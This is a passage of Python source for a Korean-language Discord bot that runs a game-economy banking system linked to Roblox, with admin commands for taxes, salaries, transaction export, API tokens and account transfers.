    embed.add_field(name="상태", value="✅ 활성화" if tax_system.get("enabled") else "❌ 비활성화", inline=True)
    embed.add_field(name="세금률", value=f"{tax_system.get('rate', 0) * 100:.2f}%", inline=True)
    embed.add_field(name="징수 주기", value=f"{tax_system.get('period_days', 30)}일", inline=True)
    embed.add_field(name="세금명", value=tax_system.get("tax_name", "세금"), inline=True)
    
    last_collected = tax_system.get("last_collected")
    if last_collected:
        try:
            last_dt = datetime.fromisoformat(last_collected)
            # UTC 시간을 한국시간(KST)으로 변환
            if last_dt.tzinfo is None:
                last_dt = last_dt.replace(tzinfo=timezone.utc)
            kst = pytz.timezone('Asia/Seoul')
            last_dt_kst = last_dt.astimezone(kst)
            last_time = last_dt_kst.strftime("%Y-%m-%d %H:%M:%S")
            embed.add_field(name="마지막 징수", value=last_time, inline=True)
        except:
            embed.add_field(name="마지막 징수", value="오류", inline=True)
    else:
        embed.add_field(name="마지막 징수", value="없음", inline=True)
    
    treasury = settings.get("treasury_account")
    if treasury:
        embed.add_field(name="국고 계좌", value=f"{treasury.get('account_name', '?')} (`{treasury.get('account_number', '?')}`)", inline=False)
    else:
        embed.add_field(name="국고 계좌", value="설정되지 않음", inline=False)
    
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="세금징수", description="[관리자] 즉시 세금을 징수합니다")
async def collect_tax(interaction: discord.Interaction):
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ 관리자만 사용가능합니다.", ephemeral=True); return
    s = load_settings()
    tax = s.get("tax_system", {})
    if not tax.get("enabled"):
        await interaction.response.send_message("세금 시스템 비활성화", ephemeral=True); return
    
    # 관리자 트리거로 설정된 세금은 징수하지 않음
    if tax.get("tax_name") == "장비를 정지합니다.":
        await interaction.response.send_message("세금 시스템 비활성화", ephemeral=True); return
    await interaction.response.defer(ephemeral=True)
    users = load_users()
    rate = float(tax.get("rate", 0))
    name = tax.get("tax_name", "세금")
    total = 0; cnt = 0
    for user_id, data in users.items():
        if not isinstance(data, dict): continue
        if data.get("공용계좌") or is_account_frozen(data.get("계좌번호")): 
            continue
        bal = int(data.get("잔액", 0))
        amt = int(bal * rate)
        if amt > 0:
            users[user_id]["잔액"] = bal - amt
            total += amt; cnt += 1
            add_transaction(name, data.get("계좌번호"), "TREASURY", amt, 0, f"{name} 징수")
    save_users(users)
    treasury = s.get("treasury_account")
    if treasury:
        treasury_acc = treasury.get("account_number")
        treasury_uid = None
        for uid, d in users.items():
            if isinstance(d, dict) and d.get("계좌번호") == treasury_acc:
                treasury_uid = uid
                break
        if treasury_uid:
            users = load_users()
            users[treasury_uid]["잔액"] = int(users[treasury_uid].get("잔액", 0)) + total
            save_users(users)
    s["tax_system"]["last_collected"] = datetime.now().isoformat()
    save_settings(s)
    await interaction.followup.send(f"🏛️ {name} 징수: {cnt}계좌 / {format_number_4digit(total)}원", ephemeral=True)

@bot.tree.command(name="세금삭제", description="[관리자] 세금 시스템을 비활성화하고 초기화합니다")
async def delete_tax(interaction: discord.Interaction):
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ 관리자만 사용할 수 있는 명령어입니다.", ephemeral=True)
        return
    
    settings = load_settings()
    tax_system = settings.get("tax_system", {})
    
    if not tax_system.get("enabled"):
        await interaction.response.send_message("❌ 세금 시스템이 이미 비활성화되어 있습니다.", ephemeral=True)
        return
    
    # 세금 시스템 초기화
    settings["tax_system"] = {
        "enabled": False,
        "rate": 0.0,
        "period_days": 30,
        "last_collected": None,
        "tax_name": "세금"
    }
    save_settings(settings)
    
    embed = discord.Embed(title="🗑️ 세금 시스템 삭제", color=0xff4444)
    embed.add_field(name="상태", value="세금 시스템이 비활성화되고 초기화되었습니다.", inline=False)
    embed.add_field(name="변경 내용", value="• 세금률: 0%\n• 징수주기: 30일\n• 세금명: 세금\n• 마지막 징수 기록: 삭제됨", inline=False)
    
    await interaction.response.send_message(embed=embed, ephemeral=True)

def extract_alias_from_name(name: str) -> str:
    try:
        if "|" in name:
            left = name.split("|")[0].strip()
            if "]" in left:
                return left.split("]", 1)[1].strip()
        return name
    except Exception:
        return name

@app_commands.choices(
    기간=[
        app_commands.Choice(name="최근 3일", value="3d"),
        app_commands.Choice(name="최근 7일", value="7d"),
        app_commands.Choice(name="전체", value="all"),
    ]
)
@bot.tree.command(name="엑셀내보내기", description="[관리자] 거래내역을 엑셀로 내보냅니다 (기간 필터)")
async def export_excel(
    interaction: discord.Interaction,
    기간: app_commands.Choice[str],
    전체내보내기: bool = True,
    사용자1: Optional[discord.Member] = None,
    사용자2: Optional[discord.Member] = None,
    사용자3: Optional[discord.Member] = None,
    사용자4: Optional[discord.Member] = None,
    사용자5: Optional[discord.Member] = None
):
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ 관리자만", ephemeral=True); return
    await interaction.response.defer(ephemeral=True)

    now = datetime.now()
    since = None
    if 기간.value == "3d":
        since = now - timedelta(days=3)
    elif 기간.value == "7d":
        since = now - timedelta(days=7)

    targets = []
    if not 전체내보내기:
        for m in [사용자1, 사용자2, 사용자3, 사용자4, 사용자5]:
            if m:
                acc = get_account_number_by_user(m.id)
                if acc: targets.append(acc)
        if not targets:
            await interaction.followup.send("대상 계좌가 없습니다.", ephemeral=True)
            return

    txs = load_transactions()
    users = load_users()
    filtered: List[Dict[str, Any]] = []
    for t in txs:
        try:
            ts = datetime.fromisoformat(t["timestamp"])
        except Exception:
            continue
        if since and ts < since:
            continue
        if 전체내보내기 or (t.get("from_user") in targets or t.get("to_user") in targets):
            filtered.append(t)

    rows = []
    acc_to_name = {}
    for uid, v in users.items():
        if isinstance(v, dict) and "계좌번호" in v:
            acc_to_name[v["계좌번호"]] = v.get("이름", "?")

    for t in filtered:
        try:
            ts = datetime.fromisoformat(t["timestamp"])
            # UTC 시간을 한국시간(KST)으로 변환
            if ts.tzinfo is None:
                ts = ts.replace(tzinfo=timezone.utc)
            kst = pytz.timezone('Asia/Seoul')
            ts_kst = ts.astimezone(kst)
            date_str = ts_kst.strftime("%Y-%m-%d")
            time_str = ts_kst.strftime("%H:%M:%S")
        except Exception:
            date_str = "-"
            time_str = "-"
        fu = t.get("from_user")
        tu = t.get("to_user")
        fu_name = fu if fu in ("SYSTEM","ADMIN","TREASURY") else acc_to_name.get(fu, "?")
        tu_name = tu if tu in ("SYSTEM","ADMIN","TREASURY") else acc_to_name.get(tu, "?")
        rows.append({
            "날짜": date_str,
            "시간": time_str,
            "거래유형": t.get("type",""),
            "송금자계좌": fu,
            "송금자이름": fu_name,
            "수금자계좌": tu,
            "수금자이름": tu_name,
            "거래금액": int(t.get("amount", 0)),
            "수수료": int(t.get("fee", 0)),
            "메모": t.get("memo","")
        })

    df = pd.DataFrame(rows)
    filename = f"거래내보내기_{기간.value}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.xlsx"
    path = f"/tmp/{filename}"
    try:
        with pd.ExcelWriter(path, engine="openpyxl") as w:
            df.to_excel(w, index=False, sheet_name="거래내역")
        with open(path,"rb") as f:
            await interaction.followup.send(
                content=f"📊 {기간.name} 기준 총 {len(rows)}건",
                file=discord.File(f, filename),
                ephemeral=True
            )
    finally:
        try:
            if os.path.exists(path):
                os.remove(path)
        except Exception:
            pass

def _generate_code(n=6)->str:
    return "".join(random.choice(string.digits) for _ in range(n))

@bot.tree.command(name="연동요청", description="로블록스 계정 연동용 6자리 코드를 발급합니다")
async def link_request(interaction: discord.Interaction):
    links = load_links()
    code = _generate_code()
    expire = (datetime.now() + timedelta(minutes=10)).isoformat()
    links["pending"][str(interaction.user.id)] = {"code": code, "expire": expire}
    save_links(links)
    path = "/api/roblox/verify-code"
    url_hint = f"{BASE_URL}{path}" if BASE_URL else f"(서버 배포 후 {path})"
    embed = discord.Embed(title="🔗 연동 코드 발급", color=0x00bcd4)
    embed.add_field(name="코드", value=f"`{code}`", inline=True)
    embed.add_field(name="유효시간", value="10분", inline=True)
    embed.add_field(
        name="안내",
        value=f"게임 내 연동 UI에 이 코드를 입력하세요.\n게임 서버는 {url_hint} 엔드포인트로 코드를 검증합니다.",
        inline=False
    )
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="연동상태", description="내 디스코드-로블록스 연동 상태를 확인합니다")
async def link_status(interaction: discord.Interaction):
    links = load_links()
    info = links["links"].get(str(interaction.user.id))
    if not info:
        await interaction.response.send_message("❌ 연동되지 않았습니다. `/연동요청`으로 코드를 발급하세요.", ephemeral=True)
        return
    embed = discord.Embed(title="✅ 연동됨", color=0x00c853)
    embed.add_field(name="Roblox UserId", value=str(info.get("roblox_user_id")), inline=True)
    embed.add_field(name="Roblox Username", value=info.get("roblox_username","?"), inline=True)
    embed.add_field(name="연동 시각", value=info.get("linked_at","-"), inline=False)
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="연동해제", description="디스코드-로블록스 연동을 해제합니다")
async def link_unlink(interaction: discord.Interaction):
    links = load_links()
    if str(interaction.user.id) in links["links"]:
        links["links"].pop(str(interaction.user.id), None)
        save_links(links)
        await interaction.response.send_message("연동 해제 완료", ephemeral=True)
    else:
        await interaction.response.send_message("연동되어 있지 않습니다.", ephemeral=True)

@bot.tree.command(name="관리자데이터병합", description="[관리자] CSV 업로드로 계좌 잔액을 갱신합니다.")
async def admin_import_csv(
    interaction: discord.Interaction,
    파일: discord.Attachment,
    create_missing: Optional[bool] = False
):
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("관리자만 사용 가능합니다.", ephemeral=True); return
    try:
        if not interaction.response.is_done():
            await interaction.response.defer(ephemeral=True, thinking=True)
    except Exception:
        pass
    if not (파일.filename.lower().endswith(".csv")):
        await interaction.followup.send("CSV 파일만 지원합니다.", ephemeral=True); return

    try:
        raw = await 파일.read()
        text = raw.decode("utf-8", errors="ignore")
    except Exception as e:
        await interaction.followup.send(f"파일 읽기 오류: {e}", ephemeral=True); return

    rows = []
    try:
        df = pd.read_csv(io.StringIO(text))
        rows = df.to_dict(orient="records")
    except Exception:
        try:
            reader = csv.DictReader(io.StringIO(text))
            rows = list(reader)
        except Exception as e2:
            await interaction.followup.send(f"CSV 파싱 실패: {e2}", ephemeral=True); return
    if not rows:
        await interaction.followup.send("CSV가 비어있습니다.", ephemeral=True); return

    def norm(k:str)->str:
        k = (k or "").strip().lower()
        mp = {"계좌번호":"account_number","account_number":"account_number","account":"account_number","계좌":"account_number",
              "잔액":"balance","balance":"balance","잔고":"balance",
              "이름":"name","name":"name"}
        return mp.get(k,k)

    users = load_users()
    created=updated=skipped=0
    for row in rows:
        r = {norm(k):v for k,v in row.items()}
        acc = r.get("account_number"); bal = r.get("balance"); name = r.get("name")
        if acc is None or bal is None:
            skipped+=1; continue
        acc = str(acc).strip()
        try:
            bal = int(float(str(bal).replace(",","")))
        except Exception:
            skipped+=1; continue
        if acc not in users:
            if create_missing:
                users[acc] = {"이름": str(name or f"사용자({acc})"), "계좌번호": acc, "잔액": bal}
                created+=1
            else:
                skipped+=1
        else:
            users[acc]["잔액"] = bal
            if name: users[acc]["이름"] = str(name)
            updated+=1
    save_users(users)
    embed = discord.Embed(title="📥 DB 갱신 결과", color=0x00b894)
    embed.add_field(name="업데이트", value=str(updated))
    embed.add_field(name="신규 생성", value=str(created))
    embed.add_field(name="스킵", value=str(skipped))
    await interaction.followup.send(embed=embed, ephemeral=True)

def generate_api_token(n=32):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))

@bot.tree.command(name="관리자맵api생성", description="[관리자] 새로운 Roblox 맵 API 토큰을 생성합니다")
async def admin_create_map_api(interaction: discord.Interaction, 맵이름: str):
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ 관리자만 사용", ephemeral=True); return
    apis = load_map_apis()
    if 맵이름 in apis.get("maps", {}):
        await interaction.response.send_message("❌ 이미 존재하는 맵 이름입니다.", ephemeral=True); return
    token = generate_api_token()
    apis["maps"][맵이름] = {
        "token": token,
        "enabled": True,
        "created_by": interaction.user.id,
        "created_at": datetime.now().isoformat()
    }
    save_map_apis(apis)
    embed = discord.Embed(title="🗺️ 맵 API 생성 완료", color=0x00bcd4)
    embed.add_field(name="맵 이름", value=맵이름, inline=False)
    embed.add_field(name="API 토큰", value=f"`{token}`", inline=False)
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="관리자맵api목록", description="[관리자] Roblox 맵 API 목록을 조회합니다")
async def admin_list_map_apis(interaction: discord.Interaction):
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ 관리자만 사용", ephemeral=True); return
    apis = load_map_apis()
    maps = apis.get("maps", {})
    if not maps:
        await interaction.response.send_message("등록된 맵 API가 없습니다.", ephemeral=True); return
    embed = discord.Embed(title="🗺️ 맵 API 목록", color=0x0099ff)
    for name, info in maps.items():
        status = "✅" if info.get("enabled") else "❌"
        embed.add_field(
            name=f"{status} {name}",
            value=f"토큰: `{mask_token(info.get('token'))}`\n생성자: <@{info.get('created_by','?')}>\n생성일: {info.get('created_at','-')}",
            inline=False
        )
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="관리자맵api활성화", description="[관리자] 맵 API를 활성화합니다")
async def admin_enable_map_api(interaction: discord.Interaction, 맵이름: str):
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ 관리자만 사용", ephemeral=True); return
    apis = load_map_apis()
    if 맵이름 not in apis.get("maps", {}):
        await interaction.response.send_message("❌ 해당 맵 이름 없음", ephemeral=True); return
    apis["maps"][맵이름]["enabled"] = True
    save_map_apis(apis)
    await interaction.response.send_message(f"✅ 맵 API 활성화: {맵이름}", ephemeral=True)

@bot.tree.command(name="관리자맵api비활성화", description="[관리자] 맵 API를 비활성화합니다")
async def admin_disable_map_api(interaction: discord.Interaction, 맵이름: str):
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ 관리자만 사용", ephemeral=True); return
    apis = load_map_apis()
    if 맵이름 not in apis.get("maps", {}):
        await interaction.response.send_message("❌ 해당 맵 이름 없음", ephemeral=True); return
    apis["maps"][맵이름]["enabled"] = False
    save_map_apis(apis)
    await interaction.response.send_message(f"❌ 맵 API 비활성화: {맵이름}", ephemeral=True)

@bot.tree.command(name="관리자맵api토큰재발급", description="[관리자] 맵 API 토큰을 재발급합니다")
async def admin_regen_map_api_token(interaction: discord.Interaction, 맵이름: str):
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ 관리자만 사용", ephemeral=True); return
    apis = load_map_apis()
    if 맵이름 not in apis.get("maps", {}):
        await interaction.response.send_message("❌ 해당 맵 이름 없음", ephemeral=True); return
    token = generate_api_token()
    apis["maps"][맵이름]["token"] = token
    save_map_apis(apis)
    embed = discord.Embed(title="🔄 맵 API 토큰 재발급", color=0xff9800)
    embed.add_field(name="맵 이름", value=맵이름, inline=False)
    embed.add_field(name="새 토큰", value=f"`{token}`", inline=False)
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="관리자맵api삭제", description="[관리자] 맵 API를 삭제합니다")
async def admin_delete_map_api(interaction: discord.Interaction, 맵이름: str):
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ 관리자만 사용", ephemeral=True); return
    apis = load_map_apis()
    if 맵이름 not in apis.get("maps", {}):
        await interaction.response.send_message("❌ 해당 맵 이름 없음", ephemeral=True); return
    apis["maps"].pop(맵이름)
    save_map_apis(apis)
    await interaction.response.send_message(f"🗑️ 맵 API 삭제 완료: {맵이름}", ephemeral=True)

def get_user_salary(user_id: int) -> int:
    settings = load_settings()
    return int(settings.get("salary_system", {}).get("user_salaries", {}).get(str(user_id), 0))

def set_user_salary(user_id: int, amount: int):
    settings = load_settings()
    salary_sys = settings.setdefault("salary_system", {})
    user_salaries = salary_sys.setdefault("user_salaries", {})
    user_salaries[str(user_id)] = int(amount)
    save_settings(settings)

def remove_user_salary(user_id: int):
    settings = load_settings()
    salary_sys = settings.setdefault("salary_system", {})
    user_salaries = salary_sys.setdefault("user_salaries", {})
    user_salaries.pop(str(user_id), None)
    save_settings(settings)

@bot.tree.command(name="관리자월급설정", description="[관리자] 특정 사용자에게 월급을 설정합니다")
async def admin_set_user_salary(interaction: discord.Interaction, 대상: discord.Member, 월급: int):
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ 관리자만 사용", ephemeral=True); return
    if 월급 < 0:
        await interaction.response.send_message("월급은 0 이상이어야 합니다.", ephemeral=True); return
    set_user_salary(대상.id, 월급)
    await interaction.response.send_message(f"✅ {대상.display_name}({대상.id})의 월급이 {format_number_4digit(월급)}원으로 설정되었습니다.", ephemeral=True)

@bot.tree.command(name="관리자월급수정", description="[관리자] 특정 사용자의 월급을 수정합니다")
async def admin_modify_user_salary(interaction: discord.Interaction, 대상: discord.Member, 월급: int):
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ 관리자만 사용", ephemeral=True); return
    if 월급 < 0:
        await interaction.response.send_message("월급은 0 이상이어야 합니다.", ephemeral=True); return
    set_user_salary(대상.id, 월급)
    await interaction.response.send_message(f"✏️ {대상.display_name}({대상.id})의 월급이 {format_number_4digit(월급)}원으로 수정되었습니다.", ephemeral=True)

@bot.tree.command(name="관리자월급삭제", description="[관리자] 특정 사용자의 월급을 삭제합니다")
async def admin_remove_user_salary(interaction: discord.Interaction, 대상: discord.Member):
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ 관리자만 사용", ephemeral=True); return
    remove_user_salary(대상.id)
    await interaction.response.send_message(f"🗑️ {대상.display_name}({대상.id})의 월급이 삭제되었습니다.", ephemeral=True)

from web import keep_alive

async def auto_pay_salary_task():
    await bot.wait_until_ready()
    import pytz
    kst = pytz.timezone("Asia/Seoul")
    last_paid_key = "last_paid_user_salary"
    while not bot.is_closed():
        now_utc = datetime.now(timezone.utc)
        now_kst = now_utc.astimezone(kst)
        if now_kst.weekday() == 5:
            first_day = now_kst.replace(day=1)
            first_saturday = 1 + (5 - first_day.weekday()) % 7
            second_saturday = first_saturday + 7
            if now_kst.day == second_saturday and now_kst.hour == 0:
                settings = load_settings()
                salary_sys = settings.setdefault("salary_system", {})
                user_salaries = salary_sys.get("user_salaries", {})
                last_paid = salary_sys.get(last_paid_key)
                today_str = now_kst.strftime("%Y-%m-%d")
                if last_paid != today_str:
                    users = load_users()
                    paid_users = []
                    for user_id, amount in user_salaries.items():
                        if user_id in users and int(amount) > 0:
                            users[user_id]["잔액"] = int(users[user_id].get("잔액", 0)) + int(amount)
                            add_transaction("월급지급", "SYSTEM", users[user_id]["계좌번호"], int(amount), 0, memo="월급 자동 지급")
                            paid_users.append(user_id)
                    save_users(users)
                    salary_sys[last_paid_key] = today_str
                    save_settings(settings)
                    for guild in bot.guilds:
                        for channel in guild.text_channels:
                            if channel.permissions_for(guild.me).send_messages:
                                try:
                                    await channel.send(f"💸 {len(paid_users)}명의 사용자에게 월급이 지급되었습니다! (2번째 토요일)")
                                except Exception:
                                    pass
                                break
        await asyncio.sleep(60 * 60)

@bot.tree.command(name="사용자공용계좌명의거래", description="공용계좌 비밀번호로 공용계좌에서 다른 계좌로 송금합니다")
async def user_public_account_transfer(
    interaction: discord.Interaction,
    공용계좌번호: str,
    비밀번호: str,
    받는계좌번호: str,
    금액: int,
    메모: str = ""
):
    public_accounts = load_public_accounts()
    matched = None
    for name, data in public_accounts.items():
        if data.get("account_number") == 공용계좌번호 and data.get("password") == 비밀번호:
            matched = data
            break
    if not matched:
        await interaction.response.send_message("❌ 공용계좌번호 또는 비밀번호가 올바르지 않습니다.", ephemeral=True)
        return
    users = load_users()
    public_user_id = None
    for uid, udata in users.items():
        if isinstance(udata, dict) and udata.get("계좌번호") == 공용계좌번호:
            public_user_id = uid
            break
    if not public_user_id:
        await interaction.response.send_message("❌ 공용계좌 데이터가 없습니다.", ephemeral=True)
        return
    recipient_id = None
    for uid, udata in users.items():
        if isinstance(udata, dict) and udata.get("계좌번호") == 받는계좌번호:
            recipient_id = uid
            break
    if not recipient_id:
        await interaction.response.send_message("❌ 받는 계좌번호가 존재하지 않습니다.", ephemeral=True)
        return
    if is_account_frozen(공용계좌번호) or is_account_frozen(받는계좌번호):
        await interaction.response.send_message("❌ 동결된 계좌가 포함되어 있습니다.", ephemeral=True)
        return
    if 금액 <= 0:
        await interaction.response.send_message("❌ 송금 금액은 0보다 커야 합니다.", ephemeral=True)
        return
    if int(users[public_user_id].get("잔액", 0)) < 금액:
        await interaction.response.send_message("❌ 공용계좌 잔액이 부족합니다.", ephemeral=True)
        return
    users[public_user_id]["잔액"] = int(users[public_user_id].get("잔액", 0)) - int(금액)
    users[recipient_id]["잔액"] = int(users[recipient_id].get("잔액", 0)) + int(금액)
    save_users(users)
    add_transaction("공용계좌명의거래", 공용계좌번호, 받는계좌번호, int(금액), 0, 메모)
    embed = discord.Embed(title="🏦 공용계좌 명의 송금 완료", color=0x00bcd4)
    embed.add_field(name="공용계좌", value=f"`{공용계좌번호}`", inline=True)
    embed.add_field(name="받는 계좌", value=f"`{받는계좌번호}`", inline=True)
    embed.add_field(name="송금액", value=f"{format_number_4digit(int(금액))}원", inline=True)
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="관리자공무집행", description="[관리자] 특정 계좌의 돈을 압류하여 공용계좌로 이체합니다")
@app_commands.describe(
    대상="압류할 대상 사용자",
    금액="압류할 금액",
    공용계좌번호="압류금이 들어갈 공용계좌번호",
    메모="압류 사유/메모"
)
async def admin_confiscate(
    interaction: discord.Interaction,
    대상: discord.Member,
    금액: int,
    공용계좌번호: str,
    메모: str = ""
):
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ 관리자만 사용", ephemeral=True)
        return
        
    users = load_users()
    대상_id = str(대상.id)
    
    if 대상_id not in users:
        await interaction.response.send_message("❌ 대상 사용자의 계좌가 없습니다.", ephemeral=True)
        return
        
    if 금액 <= 0:
        await interaction.response.send_message("압류 금액은 0보다 커야 합니다.", ephemeral=True)
        return
        
    if is_account_frozen(users[대상_id]["계좌번호"]):
        await interaction.response.send_message("❌ 대상 계좌가 동결되어 있습니다.", ephemeral=True)
        return
        
    publics = load_public_accounts()
    public_acc = None
    public_acc_name = None
    
    for name, data in publics.items():
        if data.get("account_number") == 공용계좌번호:
            public_acc = data
            public_acc_name = name
            break
            
    if not public_acc:
        await interaction.response.send_message("❌ 해당 공용계좌번호가 존재하지 않습니다.", ephemeral=True)
        return
        
    public_user_id = None
    for uid, udata in users.items():
        if isinstance(udata, dict) and udata.get("계좌번호") == 공용계좌번호:
            public_user_id = uid
            break
            
    if not public_user_id:
        await interaction.response.send_message("❌ 공용계좌 데이터가 없습니다.", ephemeral=True)
        return
        
    if int(users[대상_id].get("잔액", 0)) < 금액:
        금액 = int(users[대상_id].get("잔액", 0))
        
    if 금액 <= 0:
        await interaction.response.send_message("압류할 금액이 없습니다.", ephemeral=True)
        return
        
    users[대상_id]["잔액"] = int(users[대상_id].get("잔액", 0)) - int(금액)
    users[public_user_id]["잔액"] = int(users[public_user_id].get("잔액", 0)) + int(금액)
    save_users(users)
    
    add_transaction(
        "공무집행압류",
        users[대상_id]["계좌번호"],
        공용계좌번호,
        int(금액),
        0,
        메모 or f"공무집행 압류 ({interaction.user.display_name})"
    )
    
    embed = discord.Embed(title="⚖️ 공무집행 압류 완료", color=0xff9800)
    embed.add_field(name="대상", value=f"{대상.display_name} (`{users[대상_id]['계좌번호']}`)", inline=False)
    embed.add_field(name="압류 금액", value=f"{format_number_4digit(int(금액))}원", inline=True)
    embed.add_field(name="공용계좌", value=f"{public_acc_name} (`{공용계좌번호}`)", inline=False)
    if 메모:
        embed.add_field(name="메모", value=메모, inline=False)
    await interaction.response.send_message(embed=embed, ephemeral=True)

START_INFO = {
    "pid": os.getpid(),
    "start_time": datetime.now(timezone.utc).isoformat(),
    "recent_interactions": []
}
MAX_RECENT_INTERACTIONS = 20

PROCESSED_INTERACTIONS: set[str] = set()
MAX_PROCESSED = 200

def mark_interaction_once(interaction: discord.Interaction) -> bool:
    try:
        iid = str(interaction.id)
        if iid in PROCESSED_INTERACTIONS:
            return False
        PROCESSED_INTERACTIONS.add(iid)
        if len(PROCESSED_INTERACTIONS) > MAX_PROCESSED:
            tmp = list(PROCESSED_INTERACTIONS)[-MAX_PROCESSED:]
            PROCESSED_INTERACTIONS.clear()
            PROCESSED_INTERACTIONS.update(tmp)
        return True
    except Exception:
        return True

def record_interaction_id(i: discord.Interaction):
    try:
        iid = str(i.id)
        START_INFO["recent_interactions"].append(iid)
        if len(START_INFO["recent_interactions"]) > MAX_RECENT_INTERACTIONS:
            START_INFO["recent_interactions"] = START_INFO["recent_interactions"][-MAX_RECENT_INTERACTIONS:]
    except Exception:
        pass

@bot.tree.command(name="프로세스정보", description="[관리자] 현재 봇 프로세스/시작정보")
async def process_info(interaction: discord.Interaction):
    if not is_admin(interaction.user.id):
        await safe_reply(interaction, content="❌ 관리자만 사용가능한 명령어입니다.")
        return
    embed = discord.Embed(title="🧪 프로세스 정보", color=0x9e9e9e)
    embed.add_field(name="PID", value=str(START_INFO.get("pid")), inline=True)
    embed.add_field(name="시작시각(UTC)", value=START_INFO.get("start_time","-"), inline=True)
    embed.add_field(name="최근 Interaction 수", value=str(len(START_INFO.get("recent_interactions",[]))), inline=True)
    if START_INFO.get("recent_interactions"):
        embed.add_field(name="최근 IDs", value=",".join(START_INFO["recent_interactions"][-5:]), inline=False)
    await safe_reply(interaction, embed=embed)

@bot.tree.command(name="최근인터랙션", description="[관리자] 최근 처리된 인터랙션 ID 나열")
async def recent_interactions_cmd(interaction: discord.Interaction):
    if not is_admin(interaction.user.id):
        await safe_reply(interaction, content="❌ 관리자만 사용가능한 명령어입니다.")
        return
    ids = START_INFO.get("recent_interactions", [])
    txt = "\n".join(ids) or "(없음)"
    await safe_reply(interaction, content=f"```${txt}```")

@bot.event
async def on_interaction(interaction: discord.Interaction):
    try:
        print(f"[on_interaction] id={interaction.id} user={getattr(interaction.user,'id',None)} type={interaction.type}")
    except Exception:
        pass

@bot.event
async def on_ready():
    print(f'{bot.user} 봇이 준비되었습니다!')
    try:
        synced = await bot.tree.sync()
        print(f'{len(synced)}개의 명령어가 동기화되었습니다. 행복한 서버운영되시길 바랍니다. -개발자, 윤석오-')
    except Exception as e:
        print(f'명령어 동기화 실패: {e}')
    start_web_server()
    bot.loop.create_task(auto_pay_salary_task())

if __name__ == "__main__":
    if not TOKEN:
        raise RuntimeError("DISCORD_TOKEN 환경변수가 설정되지 않았습니다.")
    keep_alive()
    bot.run(TOKEN)
